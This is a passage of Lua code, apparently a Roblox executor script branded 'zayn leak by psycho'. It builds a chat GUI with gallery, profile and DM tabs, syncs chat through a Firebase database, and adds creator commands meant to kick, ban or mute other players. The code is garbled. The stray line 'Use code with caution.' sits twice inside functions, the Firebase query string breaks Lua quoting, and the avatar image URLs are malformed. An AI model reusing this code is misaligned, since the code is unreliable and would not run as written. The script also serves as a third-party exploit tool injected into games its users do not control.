Size=UDim2.new(1,-10,0,64), 
Position=UDim2.new(0,5,1,-124), 
BackgroundColor3=C.BG2, 
Visible=false, 
ZIndex=510, 
Parent=SrvPage 
}) 
corner(URLBox,10) 
stroke(URLBox,Color3.fromRGB(55,55,72)) 
local URLInput=make("TextBox",{ 
Size=UDim2.new(1,-80,0,32), 
Position=UDim2.new(0,5,0,28), 
BackgroundColor3=C.INPUT, 
PlaceholderText="rbxassetid://... or https://...", 
PlaceholderColor3=C.GRAY, 
Text="", 
TextColor3=C.WHITE, 
TextSize=11, 
Font=Enum.Font.Gotham, 
ClearTextOnFocus=false, 
ZIndex=511, 
Parent=URLBox 
}) 
corner(URLInput,6) 
local URLSend=make("TextButton",{ 
Size=UDim2.new(0,68,0,32), 
Position=UDim2.new(1,-73,0,28), 
BackgroundColor3=C.BLUE, 
Text="Send 📷", 
TextColor3=C.WHITE, 
TextSize=11, 
Font=Enum.Font.GothamBold, 
ZIndex=511, 
Parent=URLBox 
}) 
corner(URLSend,6) 
-- ============================================================ 
-- CHAT ELEMENT POPULATION SYSTEM 
-- ============================================================ 
local function addSys(text) 
if not MsgScroll then return end 
local f=make("Frame",{ 
Size=UDim2.new(1,-4,0,42), 
BackgroundColor3=C.SYSBG, 
BackgroundTransparency=0.1, 
ZIndex=503, 
Parent=MsgScroll 
}) 
corner(f,8) 
stroke(f,Color3.fromRGB(115,90,10)) 
make("TextLabel",{ 
Size=UDim2.new(1,-14,1,0), 
Position=UDim2.new(0,7,0,0), 
BackgroundTransparency=1, 
Text="⚠ [SYSTEM] : "..text, 
TextColor3=C.SYSTXT, 
TextSize=12, 
Font=Enum.Font.GothamBold, 
TextWrapped=true, 
TextXAlignment=Enum.TextXAlignment.Left, 
ZIndex=504, 
Parent=f 
}) 
task.delay(0.05,function() 
if MsgScroll then MsgScroll.CanvasPosition=Vector2.new(0,MsgScroll.AbsoluteCanvasSize.Y) end 
end) 
end 
local function addMsg(sender,text,isImg,imgUrl,overrideDisplayName) 
if ScriptBans[sender] then 
if sender == Player.Name then 
Gui:Destroy() 
Use code with caution.
Player:Kick("\n[zayn leak by psycho]\nScript interaction violation detected.")
end
return
end
if MutedPlayers.All or MutedPlayers[sender] then return end
local isMe=(sender==Player.Name)
local pObj=Players:FindFirstChild(sender)
local uid=pObj and pObj.UserId or 0
local currentDisplayName = overrideDisplayName or (isMe and ClientProfileData.DisplayName or (pObj and pObj.DisplayName or sender))
local wrap=make("Frame",{
Size=UDim2.new(1,-4,0,0),
AutomaticSize=Enum.AutomaticSize.Y,
BackgroundTransparency=1,
ZIndex=503,
Parent=MsgScroll
})
local horizontalLayout = make("UIListLayout", {
FillDirection = Enum.FillDirection.Horizontal,
SortOrder = Enum.SortOrder.LayoutOrder,
Padding = UDim.new(0,10),
VerticalAlignment = Enum.VerticalAlignment.Top,
Parent = wrap
})
local av=make("ImageButton",{
Size=UDim2.new(0,36,0,36),
BackgroundColor3=C.BG3,
Image="roblox.com"..uid.."&width=100&height=100&format=png",
LayoutOrder=1,
ZIndex=504,
Parent=wrap
})
corner(av,18)
av.MouseButton1Click:Connect(function()
openQuickAction(sender, UIS:GetMouseLocation())
end)
-- Adjusted scale constraint profiles for structural consistency in bubble views
local bub=make("Frame",{
Size=isImg and UDim2.new(0,140,0,140) or UDim2.new(0.82, -46, 0, 0),
AutomaticSize=isImg and Enum.AutomaticSize.None or Enum.AutomaticSize.Y,
BackgroundColor3=C.THEM,
BackgroundTransparency=0.08,
LayoutOrder=2,
ZIndex=504,
Parent=wrap
})
corner(bub,12)
if isImg then
local imgLabel = make("ImageLabel",{
Size=UDim2.new(1,-8,1,-8),
Position=UDim2.new(0,4,0,4),
BackgroundTransparency=1,
Image=getImageAsset(imgUrl),
ZIndex=505,
Parent=bub
})
corner(imgLabel, 8)
else
local lbl=make("TextLabel",{
Size=UDim2.new(1,-16,0,0),
AutomaticSize=Enum.AutomaticSize.Y,
Position=UDim2.new(0,8,0,6),
BackgroundTransparency=1,
Text="",
RichText=true,
TextColor3=C.WHITE,
TextSize=13,
Font=Enum.Font.Gotham,
TextWrapped=true,
TextXAlignment=Enum.TextXAlignment.Left,
ZIndex=505,
Parent=bub
})
if CREATORS[sender] then
registerRichRGB(lbl, currentDisplayName, text)
else
lbl.Text = ""..currentDisplayName..": "..text
end
make("Frame",{Size=UDim2.new(1,0,0,12),BackgroundTransparency=1,ZIndex=504,Parent=bub})
bub.InputBegan:Connect(function(inp)
if inp.UserInputType==Enum.UserInputType.MouseButton2 then
showCtx(text,UIS:GetMouseLocation().X,UIS:GetMouseLocation().Y)
end
end)
end
task.delay(0.05,function()
if MsgScroll then MsgScroll.CanvasPosition=Vector2.new(0,MsgScroll.AbsoluteCanvasSize.Y) end
end)
showBubble(sender,text,isImg,imgUrl)
end
-- ============================================================
-- MEME GALLERY TAB ENGINE
-- ============================================================
local GalleryPage=make("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
Visible=false,
ZIndex=501,
Parent=Content
})
local GScroll=make("ScrollingFrame",{
Size=UDim2.new(1,-6,1,-12),
Position=UDim2.new(0,3,0,6),
BackgroundTransparency=1,
ScrollBarThickness=4,
ScrollBarImageColor3=C.BLUE,
CanvasSize=UDim2.new(0,0,0,0),
AutomaticCanvasSize=Enum.AutomaticSize.Y,
ZIndex=502,
Parent=GalleryPage
})
make("UIGridLayout",{CellSize=UDim2.new(0,104,0,104),CellPadding=UDim2.new(0,12,0,12),Parent=GScroll})
function appendToMemeGalleryGrid(url, label)
local cell=make("ImageButton",{
Size=UDim2.new(0,104,0,104),
BackgroundColor3=C.BG3,
ScaleType=Enum.ScaleType.Stretch,
ZIndex=503,
Parent=GScroll
})
corner(cell,10)
stroke(cell,Color3.fromRGB(55,55,75))
task.spawn(function()
pcall(function() cell.Image = getImageAsset(url) end)
end)
local tip=make("TextLabel",{
Size=UDim2.new(1,0,0,20),
Position=UDim2.new(0,0,1,-20),
BackgroundColor3=Color3.fromRGB(0,0,0),
BackgroundTransparency=0.4,
Text=label,
TextColor3=C.WHITE,
TextSize=10,
Font=Enum.Font.GothamBold,
ZIndex=504,
Parent=cell
})
cell.MouseButton1Click:Connect(function()
if ScriptBans[Player.Name] then
Player:Kick("\n[zayn leak by psycho]\nScript interaction violation detected.")
return
end
addMsg(Player.Name,"",true,url)
broadcastPayload(Player.Name, "", true, url)
switchTab("SERVER")
end)
end
for i,meme in ipairs(MEMES) do
appendToMemeGalleryGrid(meme.url, meme.label)
end
local function loadSavedCustomGallery()
local raw = Player.PlayerGui:GetAttribute("XdemicUserGalleryCache")
if raw and raw ~= "" then
local ok, data = pcall(function() return HttpSvc:JSONDecode(raw) end)
if ok and type(data) == "table" then
for _, customUrl in ipairs(data) do
appendToMemeGalleryGrid(customUrl, "Saved Link 📥")
end
end
end
end
local function saveCustomUrlToGallery(url)
local currentCache = {}
local raw = Player.PlayerGui:GetAttribute("XdemicUserGalleryCache")
if raw and raw ~= "" then
local ok, data = pcall(function() return HttpSvc:JSONDecode(raw) end)
if ok and type(data) == "table" then
currentCache = data
end
end
for _, existingUrl in ipairs(currentCache) do
if existingUrl == url then return end
end
table.insert(currentCache, url)
local ok, encoded = pcall(function() return HttpSvc:JSONEncode(currentCache) end)
if ok then
Player.PlayerGui:SetAttribute("XdemicUserGalleryCache", encoded)
appendToMemeGalleryGrid(url, "Saved Link 📥")
end
end
loadSavedCustomGallery()
-- ============================================================
-- DYNAMIC PROFILE RENDERING
-- ============================================================
local ProfPage=make("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
Visible=false,
ZIndex=501,
Parent=Content
})
make("TextLabel",{
Size=UDim2.new(1,0,0,24),
Position=UDim2.new(0,0,0,6),
BackgroundTransparency=1,
Text="✍️ EDIT ACCOUNT PROFILE",
TextColor3=C.WHITE,
TextSize=14,
Font=Enum.Font.GothamBold,
ZIndex=502,
Parent=ProfPage
})
local AvF=make("Frame",{
Size=UDim2.new(0,70,0,70),
Position=UDim2.new(0.5,-35,0,32),
BackgroundColor3=C.BLUE,
ZIndex=502,
Parent=ProfPage
})
corner(AvF,35)
local AvI=make("ImageLabel",{
Size=UDim2.new(1,-4,1,-4),
Position=UDim2.new(0,2,0,2),
BackgroundTransparency=1,
Image="roblox.com"..Player.UserId.."&width=150&height=150&format=png",
ZIndex=503,
Parent=AvF
})
corner(AvI,33)
local dynamicNameLabel=make("TextLabel",{
Size=UDim2.new(1,-12,0,18),
Position=UDim2.new(0,6,0,108),
BackgroundTransparency=1,
Text="Showing Profile: "..ClientProfileData.DisplayName,
TextColor3=C.SYSTXT,
TextSize=11,
Font=Enum.Font.GothamBold,
ZIndex=502,
Parent=ProfPage
})
local function mkBox(ph,y,h)
local b=make("TextBox",{
Size=UDim2.new(1,-14,0,h or 34),
Position=UDim2.new(0,7,0,y),
BackgroundColor3=C.BG3,
BackgroundTransparency=0.15,
PlaceholderText=ph,
PlaceholderColor3=C.GRAY,
Text="",
TextColor3=C.WHITE,
TextSize=12,
Font=Enum.Font.Gotham,
ClearTextOnFocus=false,
ZIndex=502,
Parent=ProfPage
})
corner(b,8)
stroke(b,Color3.fromRGB(50,50,68))
return b
end
local DIn=mkBox("Change Display name...",132)
DIn.Text=ClientProfileData.DisplayName
local BIn=mkBox("Write profile bio description...",170,54)
BIn.MultiLine=true
local SvB=make("TextButton",{
Size=UDim2.new(1,-14,0,38),
Position=UDim2.new(0,7,0,234),
BackgroundColor3=C.BLUE,
Text="APPLY CHANGES & SYNC",
TextColor3=C.WHITE,
TextSize=12,
Font=Enum.Font.GothamBold,
ZIndex=502,
Parent=ProfPage
})
corner(SvB,10)
SvB.MouseButton1Click:Connect(function()
if DIn.Text ~= "" then
ClientProfileData.DisplayName = DIn.Text
ClientProfileData.Bio = BIn.Text
dynamicNameLabel.Text = "Showing Profile: "..ClientProfileData.DisplayName
addSys("Successfully re-cached client credentials configuration profile.")
tw(SvB,0.1,{BackgroundColor3=C.GREEN})
task.delay(0.5,function()
if SvB then tw(SvB,0.2,{BackgroundColor3=C.BLUE}) end
end)
end
end)
-- ============================================================
-- DIRECT MESSAGES (DMs) ENGAGEMENT ENGINE
-- ============================================================
local DMPage=make("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
Visible=false,
ZIndex=501,
Parent=Content
})
local DML=make("ScrollingFrame",{
Size=UDim2.new(1,-6,1,-60),
Position=UDim2.new(0,3,0,30),
BackgroundTransparency=1,
ScrollBarThickness=2,
CanvasSize=UDim2.new(0,0,0,0),
AutomaticCanvasSize=Enum.AutomaticSize.Y,
ZIndex=502,
Parent=DMPage
})
ll(DML,Enum.FillDirection.Vertical,4)
local DMS=make("TextBox",{
Size=UDim2.new(1,-6,0,32),
Position=UDim2.new(0,3,1,-34),
BackgroundColor3=C.INPUT,
PlaceholderText="🔍 Search username to direct message...",
PlaceholderColor3=C.GRAY,
Text="",
TextColor3=C.WHITE,
TextSize=12,
Font=Enum.Font.Gotham,
ClearTextOnFocus=false,
ZIndex=502,
Parent=DMPage
})
corner(DMS,16)
local CvView=make("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundColor3=C.WIN,
BackgroundTransparency=0.05,
Visible=false,
ZIndex=515,
Parent=DMPage
})
local CvBack=make("TextButton",{
Size=UDim2.new(0,62,0,26),
Position=UDim2.new(0,4,0,4),
BackgroundColor3=C.BG3,
Text="← Back",
TextColor3=C.WHITE,
TextSize=11,
Font=Enum.Font.GothamBold,
ZIndex=516,
Parent=CvView
})
corner(CvBack,6)
local CvNm=make("TextLabel",{
Size=UDim2.new(1,-80,0,26),
Position=UDim2.new(0,72,0,4),
BackgroundTransparency=1,
Text="DM Target User",
TextColor3=C.WHITE,
TextSize=12,
Font=Enum.Font.GothamBold,
TextXAlignment=Enum.TextXAlignment.Left,
ZIndex=516,
Parent=CvView
})
local CvScrl=make("ScrollingFrame",{
Size=UDim2.new(1,-6,1,-72),
Position=UDim2.new(0,3,0,36),
BackgroundTransparency=1,
ScrollBarThickness=2,
CanvasSize=UDim2.new(0,0,0,0),
AutomaticCanvasSize=Enum.AutomaticSize.Y,
ZIndex=516,
Parent=CvView
})
ll(CvScrl,Enum.FillDirection.Vertical,4)
local CvIB=make("Frame",{
Size=UDim2.new(1,-6,0,36),
Position=UDim2.new(0,3,1,-38),
BackgroundColor3=C.INPUT,
ZIndex=516,
Parent=CvView
})
corner(CvIB,18)
local CvIn=make("TextBox",{
Size=UDim2.new(1,-50,1,-6),
Position=UDim2.new(0,8,0,3),
BackgroundTransparency=1,
PlaceholderText="Type encrypted response message...",
PlaceholderColor3=C.GRAY,
Text="",
TextColor3=C.WHITE,
TextSize=12,
Font=Enum.Font.Gotham,
ClearTextOnFocus=false,
ZIndex=517,
Parent=CvIB
})
local CvSnd=make("TextButton",{ 
Size=UDim2.new(0,30,0,30), 
Position=UDim2.new(1,-34,0.5,-15), 
BackgroundColor3=C.BLUE, 
Text="↑", 
TextColor3=C.WHITE, 
TextSize=15, 
Font=Enum.Font.GothamBold, 
ZIndex=517, 
Parent=CvIB 
}) 
corner(CvSnd,15) 
CvBack.MouseButton1Click:Connect(function() 
CvView.Visible=false 
dmTarget=nil 
end) 
local function addDMMsg(scroll,sender,text,ts) 
if ScriptBans[sender] then return end 
local isMe=(sender==Player.Name) 
local b=make("Frame",{ 
Size=UDim2.new(0.76,0,0,0), 
AutomaticSize=Enum.AutomaticSize.Y, 
Position=isMe and UDim2.new(0.24,0,0,0) or UDim2.new(0,0,0,0), 
BackgroundColor3=isMe and C.ME or C.THEM, 
ZIndex=520, 
Parent=scroll 
}) 
corner(b,10) 
local l=make("TextLabel",{ 
Size=UDim2.new(1,-10,0,0), 
AutomaticSize=Enum.AutomaticSize.Y, 
Position=UDim2.new(0,5,0,5), 
BackgroundTransparency=1, 
Text=text, 
TextColor3=C.WHITE, 
TextSize=12, 
Font=Enum.Font.Gotham, 
TextWrapped=true, 
TextXAlignment=Enum.TextXAlignment.Left, 
ZIndex=521, 
Parent=b 
}) 
make("Frame",{Size=UDim2.new(1,0,0,12),BackgroundTransparency=1,ZIndex=520,Parent=b}) 
task.delay(0.05,function() 
if scroll then scroll.CanvasPosition=Vector2.new(0,scroll.AbsoluteCanvasSize.Y) end 
end) 
end 
function addDMContact(username) 
if dmContacts[username] or ScriptBans[username] then return end 
dmContacts[username]=true 
local key=dmKey(Player.Name,username) 
local pMatch=Players:FindFirstChild(username) 
local targetId=pMatch and pMatch.UserId or 0 
local row=make("TextButton",{ 
Name=username, 
Size=UDim2.new(1,-4,0,46), 
BackgroundColor3=C.BG2, 
Text="", 
ZIndex=503, 
Parent=DML 
}) 
corner(row,8) 
stroke(row,Color3.fromRGB(50,50,65)) 
local pimg=make("ImageLabel",{ 
Size=UDim2.new(0,32,0,32), 
Position=UDim2.new(0,6,0,7), 
BackgroundColor3=C.BG3, 
Image="https://roblox.com"..targetId.."&width=100&height=100&format=png", 
ZIndex=504, 
Parent=row 
}) 
corner(pimg,16) 
make("TextLabel",{ 
Size=UDim2.new(1,-50,1,0), 
Position=UDim2.new(0,46,0,0), 
BackgroundTransparency=1, 
Text="💬 "..username, 
TextColor3=C.WHITE, 
TextSize=12, 
Font=Enum.Font.GothamBold, 
TextXAlignment=Enum.TextXAlignment.Left, 
ZIndex=504, 
Parent=row 
}) 
row.MouseButton1Click:Connect(function() 
dmTarget=username 
CvNm.Text="Direct Chat: @"..username 
CvView.Visible=true 
for _,c in ipairs(CvScrl:GetChildren()) do 
if c:IsA("Frame") then c:Destroy() end 
end 
for _,msg in ipairs(loadConvo(key)) do 
addDMMsg(CvScrl,msg.s,msg.t,msg.ts) 
end 
end) 
end 
local function sendDM() 
if not dmTarget or ScriptBans[dmTarget] then return end 
local txt=CvIn.Text 
if txt=="" then return end 
CvIn.Text="" 
local key=dmKey(Player.Name,dmTarget) 
appendDM(key,{s=Player.Name,t=txt,ts=getTime()}) 
addDMMsg(CvScrl,Player.Name,txt,getTime()) 
end 
CvSnd.MouseButton1Click:Connect(sendDM) 
CvIn.FocusLost:Connect(function(ep) 
if ep then sendDM() end 
end) 
DMS.FocusLost:Connect(function(ep) 
if ep and DMS.Text~="" then 
addDMContact(DMS.Text) 
DMS.Text="" 
end 
end) 
qaDmBtn.MouseButton1Click:Connect(function() 
QuickActionMenu.Visible = false 
addDMContact(qaTargetName) 
switchTab("DMs") 
for _, item in ipairs(DML:GetChildren()) do 
if item:IsA("TextButton") and string.find(item:GetFullName(), qaTargetName) then 
dmTarget = qaTargetName 
CvNm.Text="Direct Chat: @"..qaTargetName 
CvView.Visible=true 
local key=dmKey(Player.Name,qaTargetName) 
for _,c in ipairs(CvScrl:GetChildren()) do 
if c:IsA("Frame") then c:Destroy() end 
end 
for _,msg in ipairs(loadConvo(key)) do 
addDMMsg(CvScrl,msg.s,msg.t,msg.ts) 
end 
break 
end 
end 
end) 
-- ============================================================ 
-- TAB CONTROL HUB INTERACTION SWITCH MATRIX 
-- ============================================================ 
local pages={SERVER=SrvPage,GALLERY=GalleryPage,PROFILE=ProfPage,DMs=DMPage} 
function switchTab(name) 
currentTab=name 
for n,pg in pairs(pages) do 
pg.Visible=(n==name) 
end 
for n,t in pairs(tabBtns) do 
if n==name then 
tw(t.b,0.1,{TextColor3=C.WHITE}) 
tw(t.ul,0.1,{BackgroundTransparency=0}) 
else 
tw(t.b,0.1,{TextColor3=C.GRAY}) 
tw(t.ul,0.1,{BackgroundTransparency=1}) 
end 
end 
if name~="SERVER" then 
URLBox.Visible=false 
urlOpen=false 
end 
end 
for name,t in pairs(tabBtns) do 
t.b.MouseButton1Click:Connect(function() 
switchTab(name) 
end) 
end 
switchTab("SERVER") 
MBtn.MouseButton1Click:Connect(function() 
switchTab("GALLERY") 
end) 
-- ============================================================ 
-- CORE WINDOW OPERATIONS 
-- ============================================================ 
local function openChat() 
chatOpen=true 
Win.Visible=true 
NDot.Visible=false 
end 
local function closeChat() 
chatOpen=false 
Win.Visible=false 
URLBox.Visible=false 
urlOpen=false 
QuickActionMenu.Visible=false 
end 
XBtn.MouseButton1Click:Connect(closeChat) 
BubBtn.MouseButton1Click:Connect(function() 
if chatOpen then closeChat() else openChat() end 
end) 
local function sendMsg() 
local txt=CInput.Text 
if txt=="" then return end 
CInput.Text="" 
if ScriptBans[Player.Name] then 
txt = "IM A PUPPET" 
addMsg(Player.Name, txt, false, nil) 
task.wait(0.5) 
Gui:Destroy() 
Player:Kick("\n[zayn leak by psycho]\nScript interaction violation detected.") 
return 
end 
if txt=="/clear" then 
for _,c in ipairs(MsgScroll:GetChildren()) do 
if c:IsA("Frame") then c:Destroy() end 
end 
addSys("Clear routine execution done.") 
return 
elseif txt=="/help" or txt=="/cmds" then 
addSys("═════════════ SYSTEM COMMANDS ═════════════") 
addSys("1. /help - Shows all available system commands.") 
addSys("2. /clear - Clears your local chat feed log.") 
addSys("3. /cmds - Quick shortcut to inspect logs.") 
addSys("4. /profile - Jumps to custom profile account editor.") 
addSys("5. /gallery - Views built-in meme graphics vault.") 
addSys("6. /dms - Switches focus to active direct channels.") 
addSys("7. /server - Focus view back to main server channel.") 
addSys("8. /rejoin - Triggers instant server refresh connection.") 
addSys("9. /close - Closes down visual layout window HUD.") 
if CREATORS[Player.Name] or OWNER[Player.Name] then 
addSys("👑 ── CREATOR MODERATION ──") 
addSys("• /kick [player] [reason] - Kick player from server instance") 
addSys("• /ban [player] - Ban player execution rights permanently") 
addSys("• /mute [player] - Toggle local player feed visibility") 
addSys("• /mute all - Mute everyone in server logs") 
end 
addSys("═══════════════════════════════════════════") 
return 
elseif txt=="/profile" then 
switchTab("PROFILE") 
return 
elseif txt=="/gallery" then 
switchTab("GALLERY") 
return 
elseif txt=="/dms" then 
switchTab("DMs") 
return 
elseif txt=="/server" then 
switchTab("SERVER") 
return 
elseif txt=="/close" then 
closeChat() 
return 
elseif txt=="/rejoin" then 
TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Player) 
return 
end 
if string.sub(txt, 1, 1) == "/" and (CREATORS[Player.Name] or OWNER[Player.Name]) then 
local splitStrings = {} 
for word in string.gmatch(txt, "%S+") do 
table.insert(splitStrings, word) 
end 
local baseCmd = splitStrings[1] 
if baseCmd == "/kick" then 
local targetName = splitStrings[2] 
if targetName then 
local customReason = "[zayn leak by psycho]\nYou have been kicked from this server instance." 
if #splitStrings > 2 then 
local contextTable = {} 
for i = 3, #splitStrings do 
table.insert(contextTable, splitStrings[i]) 
end 
customReason = table.concat(contextTable, " ") 
end 
for _, targetPlayer in ipairs(Players:GetPlayers()) do 
if string.lower(targetPlayer.Name):sub(1, #targetName) == string.lower(targetName) then 
targetPlayer:Kick("\n" .. customReason) 
addSys("Kicked active user from server instance: " .. targetPlayer.Name .. " | Reason: " .. customReason) 
return 
end 
end 
addSys("Error: Player prefix '" .. targetName .. "' not found.") 
end 
return 
elseif baseCmd == "/ban" then 
local targetName = splitStrings[2] 
if targetName then 
for _, targetPlayer in ipairs(Players:GetPlayers()) do 
if string.lower(targetPlayer.Name):sub(1, #targetName) == string.lower(targetName) then 
ScriptBans[targetPlayer.Name] = true 
if targetPlayer == Player then 
Gui:Destroy() 
Player:Kick("\n[zayn leak by psycho]\nYou have been banned from utilizing this script interface.") 
end 
if DML:FindFirstChild(targetPlayer.Name) then 
DML[targetPlayer.Name]:Destroy() 
end 
addSys("Banned user from script execution engine: " .. targetPlayer.Name) 
return 
end 
end 
ScriptBans[targetName] = true 
addSys("Logged script ban identifier for offline string target: " .. targetName) 
end 
return 
elseif baseCmd == "/mute" then 
local targetName = splitStrings[2] 
if targetName == "all" then 
MutedPlayers.All = not MutedPlayers.All 
addSys("Global text compilation routing toggled. Value: " .. tostring(MutedPlayers.All)) 
return 
elseif targetName then 
for _, targetPlayer in ipairs(Players:GetPlayers()) do 
if string.lower(targetPlayer.Name):sub(1, #targetName) == string.lower(targetName) then 
MutedPlayers[targetPlayer.Name] = not MutedPlayers[targetPlayer.Name] 
addSys("Player @" .. targetPlayer.Name .. " mute status: " .. tostring(MutedPlayers[targetPlayer.Name])) 
return 
end 
end 
MutedPlayers[targetName] = not MutedPlayers[targetName] 
addSys("Configured target string mute mapping: " .. targetName) 
end 
return 
end 
end 
addMsg(Player.Name, txt, false, nil) 
broadcastPayload(Player.Name, txt, false, nil) 
end 
SBtn.MouseButton1Click:Connect(sendMsg) 
CInput.FocusLost:Connect(function(ep) 
if ep then sendMsg() end 
end) 
CamBtn.MouseButton1Click:Connect(function() 
urlOpen=not urlOpen 
URLBox.Visible=urlOpen 
end) 
URLSend.MouseButton1Click:Connect(function() 
local url=URLInput.Text 
if url=="" then return end 
URLInput.Text="" 
URLBox.Visible=false 
urlOpen=false 
if ScriptBans[Player.Name] then 
addMsg(Player.Name, "IM A PUPPET", false, nil) 
task.wait(0.5) 
Gui:Destroy() 
Player:Kick("\n[zayn leak by psycho]\nScript interaction violation detected.") 
return 
end 
Use code with caution.
addMsg(Player.Name,"",true,url)
broadcastPayload(Player.Name, "", true, url)
saveCustomUrlToGallery(url)
end)
local function broadcastJoin()
if FIREBASE_URL == "" then return end
local data = {
sender = "[SYSTEM]",
displayName = "SYSTEM",
text = "👋 " .. Player.DisplayName .. " has joined!",
isImg = false,
isSystem = true,
imgUrl = "",
timestamp = os.time()
}
local success, json = pcall(function() return HttpSvc:JSONEncode(data) end)
if success then
makeHttpRequest({
Url = FIREBASE_URL .. "global_chat.json",
Method = "POST",
Headers = { ["Content-Type"] = "application/json" },
Body = json
})
end
end
-- ==========================================================
-- DATABASE PACKET INBOUND BACKGROUND POLLING
-- ==========================================================
task.spawn(function()
while task.wait(1.5) do
if FIREBASE_URL ~= "" then
local response = makeHttpRequest({
Url = FIREBASE_URL .. "global_chat.json?orderBy="$key"&limitToLast=10",
Method = "GET"
})
if response and response.StatusCode == 200 then
local ok, data = pcall(function() return HttpSvc:JSONDecode(response.Body) end)
if ok and type(data) == "table" then
local sortedPackets = {}
for key, packet in pairs(data) do
table.insert(sortedPackets, { key = key, val = packet })
end
table.sort(sortedPackets, function(a, b) return a.key < b.key end)
for _, entry in ipairs(sortedPackets) do
if entry.key > lastProcessedKey then
lastProcessedKey = entry.key
if initialFetchDone and entry.val.sender ~= Player.Name then
if entry.val.isSystem then
addSys(entry.val.text)
else
addMsg(
entry.val.sender,
entry.val.text,
entry.val.isImg,
entry.val.imgUrl,
entry.val.displayName
)
end
if not chatOpen then
NDot.Visible = true
end
end
end
end
initialFetchDone = true
end
end
end
end
end)
task.delay(2, function()
if FIREBASE_URL ~= "" then
broadcastJoin()
end
end)
task.delay(0.2, function()
addSys("👋 " .. Player.Name .. " WELCOME, DEAR✨")
addSys("(TYPE /HELP FOR HELP)")
if FIREBASE_URL ~= "" then
addSys("🚀 GLOBAL CROSS-SERVER CHAT SYNC ACTIVE!")
else
addSys("⚠️ MULTIPLAYER OFFLINE: Check Firebase configuration!")
end
addSys("💬 Support Discord Tracker Rebranded")
end)
